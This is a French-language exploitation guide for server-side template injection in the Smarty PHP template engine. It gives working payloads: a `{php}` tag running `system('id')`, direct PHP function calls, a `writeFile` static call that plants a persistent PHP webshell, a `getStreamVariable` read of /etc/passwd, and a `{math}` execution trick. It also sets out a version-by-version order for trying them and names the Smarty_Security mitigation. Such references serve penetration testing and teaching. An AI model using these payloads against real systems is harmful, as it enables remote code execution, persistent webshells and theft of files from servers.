---
title: "Injection de template côté serveur Smarty"
description: "Exploiter la SSTI Smarty : confirmation avec {$smarty.version}, le tag {php}, les appels de méthode statique, et la voie de lecture de fichier self::getStreamVariable, avec conditionnement par version."
keywords:
  - SSTI Smarty
  - tag php
  - appel de méthode statique
  - self getStreamVariable
---

# Smarty

Smarty utilise des délimiteurs à accolade simple, donc la sonde est `{$smarty.version}`, qui renvoie la version du moteur, plutôt que `{7*7}`. Smarty expose PHP plus directement que Twig, mais les constructions disponibles dépendent fortement de la version.

La voie la plus ancienne et la plus directe est le tag `{php}`, qui exécute du PHP brut :

```smarty
{php}system('id');{/php}
```

`{php}` a été déprécié dans Smarty 3 et supprimé/désactivé par défaut dans les versions 3.1.x ultérieures, donc il ne fonctionne que sur les installations plus anciennes ou lorsque `$smarty->allow_php_tag` est activé.

Lorsque `{php}` est indisponible, la syntaxe d'expression de Smarty peut appeler des méthodes statiques et fonctions PHP. Smarty 3 permet d'appeler des fonctions PHP enregistrées et, dans de nombreuses configurations, des appels statiques arbitraires :

```smarty
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

La forme à méthode statique `writeFile` dépose un webshell PHP sur le disque, transformant l'injection en RCE persistante lorsque la racine du document est inscriptible. La méthode `self::getStreamVariable` était utilisable sur certaines versions pour lire des fichiers arbitraires :

```smarty
{self::getStreamVariable("file:///etc/passwd")}
```

La fonction `{math}` de Smarty évaluait historiquement son attribut `equation` via PHP et constituait une autre primitive d'exécution (abus du style `{math equation="system('id')"}`), resserrée dans les versions ultérieures.

Parce que le comportement dépend de la version, confirmez d'abord la version avec `{$smarty.version}`, puis essayez tour à tour `{php}`, les appels de méthode statique, et les primitives `{math}`/`writeFile`. Lorsque la politique `Smarty_Security` de Smarty est activée (`enableSecurity()`), les fonctions PHP et les appels statiques sont mis sur liste blanche et ces primitives sont bloquées, laissant la divulgation de variables comme impact restant.

## Outils

- tplmap, SSTImap

## Références

- Documentation Smarty : {php}, security policy, registered functions
- PortSwigger Web Security Academy: Server-side template injection
